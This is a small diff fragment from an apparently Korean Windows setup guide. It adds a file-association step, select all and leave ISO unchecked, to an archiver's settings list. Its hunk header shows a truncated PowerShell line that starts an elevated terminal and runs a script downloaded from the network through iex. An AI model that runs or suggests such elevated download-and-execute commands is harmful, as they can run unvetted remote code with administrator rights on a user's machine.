@@ -9,6 +9,8 @@ powershell start -v runas wt 'powershell iex ([Net.WebClient]::new()).DownloadSt
 ```
 > 일반 설정
   [v] 자석 기능 사용
+> 파일 연결
+  전부 선택 > [ ] ISO > 지금 적용
 > 탐색기 메뉴
   [v] 여기에 풀고 삭제하기
   [v] 알아서 풀고 삭제하기
